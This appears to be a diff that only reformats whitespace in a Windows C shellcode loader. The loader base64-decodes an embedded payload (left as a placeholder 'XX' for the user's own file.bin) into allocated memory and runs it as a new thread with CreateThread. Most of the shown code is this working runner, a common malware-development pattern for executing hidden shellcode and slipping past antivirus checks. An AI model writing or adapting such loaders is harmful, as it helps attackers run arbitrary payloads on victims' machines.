@@ -5,28 +5,24 @@
 #include <Wincrypt.h>
 #pragma comment (lib, "Crypt32.lib")
 
-unsigned char base64_payload[] = 
-"XX"; // Your base64 payload encode from file.bin
+unsigned char base64_payload[] = "XX"; // Your base64 payload encode from file.bin
 
 unsigned int base64_payload_len = sizeof(base64_payload);
 
 // Decodes Base64 Payload To Binary And Copies To Allocated Memory
 int DecodeBase64andCopyToAllocMemory( const BYTE * base64_source, unsigned int sourceLength, char * allocated_mem, unsigned int destinationLength ) {
-
 	DWORD outputLength;
 	BOOL cryptResult;
 
 	outputLength = destinationLength;
 	cryptResult = CryptStringToBinary( (LPCSTR) base64_source, sourceLength, CRYPT_STRING_BASE64, (BYTE * )allocated_mem, &outputLength, NULL, NULL);
-	
 	if (!cryptResult) outputLength = 0;  // failed
-	
+
 	return( outputLength );
 }
 
 
 int main(void) {
-    
 	void * alloc_mem;
 	BOOL retval;
 	HANDLE threadHandle;
@@ -51,8 +47,8 @@ int main(void) {
 
 	// If VirtualProtect succeeded, run the thread that contains the shellcodePayload
 	if ( retval != 0 ) {
-			threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
-			WaitForSingleObject(threadHandle, -1);
+		threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
+		WaitForSingleObject(threadHandle, -1);
 	}
 
 	return 0;
